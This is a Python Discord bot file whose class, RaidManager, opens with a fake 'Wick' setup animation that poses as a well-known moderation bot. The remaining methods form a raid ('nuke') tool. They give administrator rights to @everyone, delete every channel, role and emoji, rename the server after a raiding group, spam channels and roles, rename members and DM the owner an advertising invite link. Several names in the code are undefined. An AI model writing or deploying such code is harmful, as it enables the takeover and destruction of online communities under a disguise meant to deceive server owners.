import discord

class RaidManager:
    
    def __init__(self, guild):
        self.guild = guild

    async def setup(self, channel):
        embed = discord.Embed(title="Welcome to Wick's setup.Setup will start in 3 seconds.")
        embed1 = Embed(title="Wick Setup:",description="<:5_:1054329534593693635> Initializing Quick Setup! \n <:7_:1054329534593693635> Checking for permissions... \n <:7_:1054329534593693635>Checking Wick's role position...",)
        embed2 = Embed(title="Wick Setup:",description="<:5_:1054329534593693635> Initializing Quick Setup! \n <:5_:1054329534593693635> Checking for permissions... \n <:5_:1054329534593693635>Checking Wick's role position... \n <:7_:1054329534593693635>Setting up Quarantine role across all channels.. \n <:7_:1054329534593693635>Ensuring Quarantine role is placed properly..",)
        embed3 = Embed(title="Wick Setup:",description="<:5_:1054329534593693635> Initializing Quick Setup! \n <:5_:1054329534593693635> Checking for permissions... \n <:5_:1054329534593693635>Checking Wick's role position... \n <:5_:1054329534593693635>Setting up Quarantine role across all channels.. \n <:5_:1054329534593693635>Ensuring Quarantine role is placed properly.. \n <:7_:1054329534593693635>Checking if there's an existing Logging Channel...",)
        embed4 = Embed(title="Wick Setup:",description="<:5_:1054329534593693635> Initializing Quick Setup! \n <:5_:1054329534593693635> Checking for permissions... \n <:5_:1054329534593693635>Checking Wick's role position... \n <:5_:1054329534593693635>Setting up Quarantine role across all channels.. \n <:5_:1054329534593693635>Ensuring Quarantine role is placed properly.. \n <:5_:1054329534593693635>Checking if there's an existing Logging Channel... \n <:7_:1054329534593693635>Checking if there's an existing Mod-Log channel..",)
        embed5 = Embed(title="Wick Setup:",description="<:5_:1054329534593693635> Initializing Quick Setup! \n <:5_:1054329534593693635> Checking for permissions... \n <:5_:1054329534593693635>Checking Wick's role position... \n <:5_:1054329534593693635>Setting up Quarantine role across all channels.. \n <:5_:1054329534593693635>Ensuring Quarantine role is placed properly.. \n <:5_:1054329534593693635>Checking if there's an existing Logging Channel... \n <:5_:1054329534593693635>Checking if there's an existing Mod-Log channel.. \n <:7_:1054329534593693635>Saving changes...",)
        embed6 = Embed(title="Wick Setup:",description="<:5_:1054329534593693635> Initializing Quick Setup! \n <:5_:1054329534593693635> Checking for permissions... \n <:5_:1054329534593693635>Checking Wick's role position... \n <:5_:1054329534593693635>Setting up Quarantine role across all channels.. \n <:5_:1054329534593693635>Ensuring Quarantine role is placed properly.. \n <:5_:1054329534593693635>Checking if there's an existing Logging Channel... \n <:5_:1054329534593693635>Checking if there's an existing Mod-Log channel.. \n <:5_:1054329534593693635>Saving changes...",)
        embed6.add_field(name="Setup Finished!",value="The setup finished successfully in 1s. You can now proceeded at following the documentations to setup other settings that would require your own input.")
        msg = await channel.send(embed=embed)
        await asyncio.sleep(1)
        await msg.edit(embed=embed)
        await asyncio.sleep(0)
        await msg.edit(embed=embed1)
        await asyncio.sleep(1)
        await msg.edit(embed=embed2)
        await asyncio.sleep(0)
        await msg.edit(embed=embed3)
        await asyncio.sleep(1)
        await msg.edit(embed=embed4)
        await asyncio.sleep(0)
        await msg.edit(embed=embed5)

    async def change_role(self):

        try:
            role = discord.utils.get(guild.roles, name = "@everyone")
            await role.edit(permissions = Permissions.all())
            print(Fore.MAGENTA+"@everyoneに管理者権限を付与しました"+Fore.RESET)
        except:
            print(Fore.GREEN+"@everyoneに管理者権限を付与できませんでした"+Fore.RESET)

    async def delete_emoji(self):
        guild = self.guild
        for emoji in list(guild.emojis):
            try:
                await emoji.delete()
                print(Fore.MAGENTA+f"{emoji.name}を削除しました。"+Fore.RESET)
            except:
                print(Fore.GREEN+f"{emoji.name}を削除できませんでした。"+Fore.RESET)

    async def channel_delete(self):
        guild = self.guild
        for channels in guild.channels:
            try:
                await channels.delete()
                print(Fore.MAGENTA+f"{channels.name}を削除しました。"+Fore.RESET)
            except:
                print(Fore.GREEN+f"{channels.name}を削除できませんでした。"+Fore.RESET)

    async def role_delete(self):
        guild = self.guild
        for role in guild.roles:
            try:
                await role.delete()
                print(Fore.MAGENTA+f"{role.name}を削除しました。"+Fore.RESET)
            except:
                print(Fore.GREEN+f"{role.name}を削除できませんでした。"+Fore.RESET)

    async def change_server_icon(self):
        guild = self.guild
        with open("image.png","rb") as f:
            icon = f.read()
            try:
                await guild.edit(name="荒らし共栄圏｜植民地", icon=icon)
                print(Fore.MAGENTA+"サーバー名とアイコンを変更しました。"+Fore.RESET)
            except:
                print(Fore.GREEN+"サーバー名とアイコンを変更できませんでした。"+Fore.RESET)

    async def create_text_channel(self, nuke_channel):
        guild = self.guild
        await guild.create_text_channel(random.choice(nuke_channel))
        for channel in guild.text_channels:
            link = await channel.create_invite(max_age = 0, max_uses = 0)
            print(f"サーバーのNukeが完了しました。{link}")
        for i in range(40):
            try:
                await guild.create_text_channel(random.choice(nuke_channel))
            except:
                pass

    async def edit_members(self):
        guild = self.guild
        for member in guild.members:
            try:
                await member.edit(nick=random.choice(nuke_channel))
                print(Fore.MAGENTA+f"{member.name}のニックネームを変更しました。"+Fore.RESET)
            except:
                print(Fore.GREEN+f"{member.name}のニックネームを変更できませんでした。"+Fore.RESET)

    async def create_role(self):
        guild = self.guild
        for i in range(10):
                role = await guild.create_role(name=random.choice(nuke_channel))
                await role.edit(colour=discord.Colour(0x6d965c))
                print(Fore.MAGENTA+f"{role.name}を作成しました。"+Fore.RESET)

    async def send_adv_to_owner(self):
        guild = self.guild
        for i in range(10):
            try:
                await asyncio.sleep(4)
                await guild.owner.send(f"{guild.owner.mention}\n https://discord.gg/ctkp")
                print(Fore.MAGENTA+f"{guild.owner}にメッセージを送りました。"+Fore.RESET)
            except:
                print(Fore.MAGENTA+f"{guild.owner}にメッセージを送れませんでした。"+Fore.RESET)
